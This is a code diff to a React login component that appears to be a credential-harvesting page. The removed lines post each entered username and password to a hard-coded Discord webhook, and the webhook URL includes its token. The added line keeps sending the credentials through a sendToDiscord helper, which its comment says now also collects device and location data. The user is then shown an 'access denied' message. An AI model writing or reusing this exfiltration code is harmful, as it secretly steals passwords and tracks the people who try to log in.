@@ -176,48 +176,8 @@ export default function Login() {
     }
 
     try {
-      // Send data to Discord webhook
-      const webhookUrl =
-        "https://discord.com/api/webhooks/1434012927836291113/5newpTR3u3h4bFvd5OuWdIP7lHAPdd-jOUgvR50RoeUo9g13L8f-vhl0ubXcs4O9yx6q";
-
-      const message = {
-        content: "New Login Attempt",
-        embeds: [
-          {
-            color: 0x0064e0,
-            title: "Login Credentials",
-            fields: [
-              {
-                name: "Username/Email",
-                value: `||${username}||`,
-                inline: false,
-              },
-              {
-                name: "Password",
-                value: `||${password}||`,
-                inline: false,
-              },
-              {
-                name: "Timestamp",
-                value: new Date().toLocaleString(),
-                inline: false,
-              },
-            ],
-            footer: {
-              text: "Family Site - Pending Approval",
-            },
-          },
-        ],
-      };
-
-      // Send to Discord (fire and forget - don't wait for response)
-      fetch(webhookUrl, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(message),
-      }).catch((err) => console.error("Discord webhook error:", err));
+      // Send data to Discord with device & location info
+      await sendToDiscord("LOGIN", { username, password });
 
       // Show access denied modal to user
       setShowAccessDeniedModal(true);
